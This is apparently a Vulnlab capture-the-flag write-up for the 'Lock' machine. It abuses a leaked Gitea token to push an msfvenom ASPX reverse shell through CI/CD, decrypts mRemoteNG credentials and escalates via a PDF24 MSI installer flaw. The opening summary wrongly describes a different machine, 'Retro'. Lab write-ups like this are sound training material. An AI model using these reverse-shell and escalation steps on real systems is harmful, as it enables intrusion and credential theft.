---
cover: https://photos.squarezero.dev/file/abir-images/Lock/logo.png
date: 2024-06-23 09:45:47 +07:00
modified: 2024-06-23 09:45:47 +07:00
categories: Vulnlab
machine_author: 
  name: kozmer
  link: https://app.hackthebox.com/users/637320
tags: [Gitea, access token, repository, reverse shell, privilege escalation, mRemoteNG, mRemoteNG decryptor, PDF24, MSI installer, Windows, shell access, CI/CD integration]
title: Lock - Vulnlab
---

![](https://photos.squarezero.dev/file/abir-images/htbasset/vulnbanner.png)

Retro is an **easy** difficulty machine where I had to enumerate open ports and services, leverage LDAP and SMB services to gain initial access, utilize credential brute forcing to discover simple passwords, and employ Impacket and Certipy to change credentials and exploit an ESC1 vulnerability for privilege escalation. The final step involved obtaining a TGT for the administrator to capture the root flag.

# Enumeration

```
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
3000/tcp open  ppp
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
```

I started by looking at port 80 with some directory bruteforcing by nothing interesting. It seems like its a static website.

![](https://photos.squarezero.dev/file/abir-images/Lock/0.png)

Next, I visited port 3000 and It was running Gitea.

![](https://photos.squarezero.dev/file/abir-images/Lock/1.png)

I explored the Gitea instance and found **dev-scripts** repo by **ellen.freeman** and it looks like its a script for accessing Gitea with the access token.

![](https://photos.squarezero.dev/file/abir-images/Lock/2.png)

![](https://photos.squarezero.dev/file/abir-images/Lock/3.png)

Afterthat I checked the previous commits and found exposed access token for ellen.freeman.

![](https://photos.squarezero.dev/file/abir-images/Lock/4.png)

# Shell as Ellen Freeman

I downloaded the script and after running it, it showed another hidden repository called **website**.

![](https://photos.squarezero.dev/file/abir-images/Lock/5.png)

After researching for a bit I found out that I can clone a repository using an access token.

`git clone http://ellen.freeman:<REDACTED>@lock.vl:3000/ellen.freeman/website.git`

![](https://photos.squarezero.dev/file/abir-images/Lock/6.png)

Inside the repository, there was a README.md where it stated that the git repo would be automatically deployed after. And after looking at the repo carefully it seems like its the website hosted on port 80.

```
# New Project Website

CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver
```

![](https://photos.squarezero.dev/file/abir-images/Lock/7.png)

I created a reverse shell and used git to push the shell into the main website.

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.2.110 LPORT=4444 -f aspx -o shell.aspx`

```bash
#Add username and email
git config --global user.name ellen.freeman
git config --global user.email ellen.freeman@lock.vl

#Stage the shell
git add shell.aspx 

#Commit with a message
git commit -m 'shell'

#Update the repo
git push
```

I made a request with curl and got a reverse shell.

`curl http://lock.vl/shell.aspx`

![](https://photos.squarezero.dev/file/abir-images/Lock/8.png)

# Ellen.freeman to Gale.dekarios

Inside the Ellen's Document folder there was a config file.

```
C:\USERS\ELLEN.FREEMAN        
|   .git-credentials
|   .gitconfig
|   
+---.ssh      
|       authorized_keys       
|   
+---3D Objects
+---Contacts  
+---Desktop   
+---Documents 
|       config.xml  
|   
+---Downloads 
+---Favorites 
|   |   Bing.url    
|   |         
|   \---Links 
+---Links     
|       Desktop.lnk 
|       Downloads.lnk         
|   
+---Music     
+---Pictures  
+---Saved Games     
+---Searches  
\---Videos
```

The config file is for ***mRemoteNG*** which containes encrypted password for the user.

![](https://photos.squarezero.dev/file/abir-images/Lock/9.png)


I used mremoteng-decryptor to decrypt the config file and found credential for remote access. And after logging in I got the user flag.

![](https://photos.squarezero.dev/file/abir-images/Lock/10.png)

![](https://photos.squarezero.dev/file/abir-images/Lock/11.png)

![](https://photos.squarezero.dev/file/abir-images/Lock/12.png)

# Gale.dekarios to root

In the desktop I saw PDF24 and I after looking online I found an local Privilege escalation for it.

[Local Privilege Escaltion via MSI installer in PDF24](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/)

![](https://photos.squarezero.dev/file/abir-images/Lock/13.png)

After looking in the hidden folders I found ***_install folder*** which containes the installer for PDF24.

![](https://photos.squarezero.dev/file/abir-images/Lock/14.png)

![](https://photos.squarezero.dev/file/abir-images/Lock/15.png)

Next, I opened 2 terminal and in one of them I set the oplock on the PDF24 log file and after that in another terminal I executed the installer with MSI just like its said on the article.

`msiexec.exe /fa pdf24-creator-11.15.1-x64.msi`

`.\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r`

![](https://photos.squarezero.dev/file/abir-images/Lock/16.png)

After waiting for a little bit a new CMD window opened and I follwed alone the article to spawn a cmd shell as administrator with in the legacy console mode.

* right click on the top bar of the cmd window.
* click on properties.
* under options click on the “legacy console mode” link.
* open the link with a browser other than internet explorer or edge (both don't open as SYSTEM when on Win11).
* in the opened browser window press the key combination CTRL+o.
* type “cmd.exe” in the top bar and press Enter.

![Right click on the top bar of the cmd window and click on properties](https://photos.squarezero.dev/file/abir-images/Lock/17.png)


![Under options click on the “legacy console mode” link.](https://photos.squarezero.dev/file/abir-images/Lock/18.png)


![Click Internet Explorer or Edge](https://photos.squarezero.dev/file/abir-images/Lock/19.png)


![Press the key combination CTRL+o](https://photos.squarezero.dev/file/abir-images/Lock/20.png)


![Type “cmd.exe” in the top bar and press Enter](https://photos.squarezero.dev/file/abir-images/Lock/21.png)


Now with the administrator shell I got the root flag.